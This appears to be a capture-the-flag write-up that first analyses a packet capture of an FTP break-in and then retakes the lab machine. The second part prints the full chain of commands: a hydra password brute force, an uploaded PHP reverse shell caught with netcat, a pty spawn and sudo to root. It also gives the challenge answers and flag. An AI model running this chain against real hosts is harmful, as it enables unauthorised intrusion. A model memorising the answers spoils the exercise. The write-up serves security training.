---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: Oh no! We've been hacked!
### It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

We can open the PCAP file in Wireshark after downloading it.

![2](https://github.com/Knign/Write-ups/assets/110326359/f6ffd7af-2ea1-4efb-ac3a-2da64712fa21)
### No answer needed

### The attacker is trying to log into a specific service. What service is this?

If we scroll a bit we can see the following packets.

![3](https://github.com/Knign/Write-ups/assets/110326359/2ff4cc13-0380-4147-8316-e9aa824a7a7d)

We can `Follow > TCP Stream`.

![4](https://github.com/Knign/Write-ups/assets/110326359/5ac1bdf7-68a6-4340-916e-4f6b119fdf55)

This does look like a login attempt.
### Answer
```
ftp
```

&nbsp;

### There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
### Answer
```
hydra
```

&nbsp;

### The attacker is trying to log on with a specific username. What is the username?
We saw the in TCP Stream that the username was `jenny`.
### Answer
```
jenny
```

&nbsp;

### What is the user's password?
If we change the stream to 7, we can find the correct password.

![5](https://github.com/Knign/Write-ups/assets/110326359/e25a5ec5-8f2e-4cf9-8498-4ee4dc8d057a)

### Answer
```
password123
```

### What is the current FTP working directory after the attacker logged in?
We can find the current working directory on setting the stream to 16.

![6](https://github.com/Knign/Write-ups/assets/110326359/9d2b73a3-8e0c-4b80-8f36-cc2af80a9da5)

### Answer
```
/var/www/html
```

&nbsp;

### The attacker uploaded a backdoor. What is the backdoor's filename?
We can find the answer in the same stream.

![6](https://github.com/Knign/Write-ups/assets/110326359/5456c72d-910a-454f-8996-1f633f0434f9)

### Answer
```
shell.php
```

&nbsp;

### The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
In order to answer this question we have to filter the packets using the following filter:
```
ftp-data
```
- On inspecting the second packet, we can find the URL.

![7](https://github.com/Knign/Write-ups/assets/110326359/6579668c-c4cb-4bf1-a5f5-88707b493dd3)

### Answer
```
http://pentestmonkey.net/tools/php-reverse-shell
```

&nbsp;

### Which command did the attacker manually execute after getting a reverse shell?
Let's navigate to stream 20.

![8](https://github.com/Knign/Write-ups/assets/110326359/8efc9844-8221-44b8-ac8a-ebaf98378ab1)

### Answer
```
whoami
```

&nbsp;

### What is the computer's hostname?
In the same stream, we can find the computer's host name.

![9](https://github.com/Knign/Write-ups/assets/110326359/9eafa666-c7b2-4367-8314-3a1c649ef944)

### Answer
```
wir3
```

&nbsp;

### Which command did the attacker execute to spawn a new TTY shell?
The answer is in the same stream.

![10](https://github.com/Knign/Write-ups/assets/110326359/7931839e-a6ef-43a9-ba2d-c1b9ee6278c9)

### Answer
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

&nbsp;

### Which command was executed to gain a root shell?
Again in the same stream, we can find the answer.

![11](https://github.com/Knign/Write-ups/assets/110326359/8cf485e5-a622-4e90-aef5-1b0018aa96b0)

### Answer
```
sudo su
```

&nbsp;

### The attacker downloaded something from GitHub. What is the name of the GitHub project?
We can find the git clone that the attacker used.

![12](https://github.com/Knign/Write-ups/assets/110326359/97291d3a-3efd-4076-bd94-1f071fbd1140)

### Answer
```
Reptile
```

&nbsp;

### The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
This type of backdoor is called a Rootkit.
### Answer
```
Rootkit
```

&nbsp;

## Task 2: Hack your way back into the machine
### Read the flag.txt file inside the Reptile directory
Let's scan the target using `nmap`.
```
$ nmap -sC -sV 10.10.108.36 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 16:52 IST
Nmap scan report for 10.10.108.36
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.62 seconds
```
There are three open ports:

| Port | Service |
|---|---|
| 21 | ftp  |
| 80 | http | 

We know that the user `jenny` changed the password.

Let's brute force it using `hydra`.
```
$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.108.36
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 17:02:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.108.36:21/
[21][ftp] host: 10.10.108.36   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 17:03:04 
```
Let's login through FTP using `jenny` as the username and `987654321` as the password.
```
$ ftp jenny@10.10.108.36
Connected to 10.10.108.36.
220 Hello FTP World!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Let's look around to find something important,
```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
```
We can download these files using the `get` command.
```
ftp> get shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for shell.php (5493 bytes).
100% |***********************************************************************************************************************************************************************************************|  5493       64.89 KiB/s    00:00 ETA
226 Transfer complete.
5493 bytes received in 00:00 (24.22 KiB/s)
ftp> get index.html
local: index.html remote: index.html
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for index.html (10918 bytes).
100% |***********************************************************************************************************************************************************************************************| 10918        3.20 MiB/s    00:00 ETA
226 Transfer complete.
10918 bytes received in 00:00 (81.19 KiB/s)
```
We have to modify the shell a bit.

![14](https://github.com/Knign/Write-ups/assets/110326359/2b365513-6f7d-472c-9900-0063ed6c5bd6)

We set he IP address to our `tun0` interface and the port to any port we like.

Let's upload the modified `shell.php` using the `put` command.
```
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|  5494        3.20 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (19.89 KiB/s)
```
We have successfully uploaded our `shell.php` file to the FTP server. 

Let's start listening for connections using `nc`.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
```
Now we have to download the shell through our browser.

![15](https://github.com/Knign/Write-ups/assets/110326359/cfa0e924-1c2b-4aad-b37f-a7771f0edac7)

Let's check our listener.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.108.36] 49210
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 11:51:14 up 31 min,  0 users,  load average: 0.00, 0.00, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Let's het a bash shell and switch user to `jenny`.
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ 
```
Let's check what files `jenny` can execute without the password.
```
jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
```
We have permissions to switch user to `root`.
```
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# 
```
Let's read the flag.txt file inside the Reptile directory.
```
root@wir3:/# cat /root/Reptile/flag.txt
cat /root/Reptile/flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
```
### Answer
```
ebcefd66ca4b559d17b440b6e67fd0fd
```
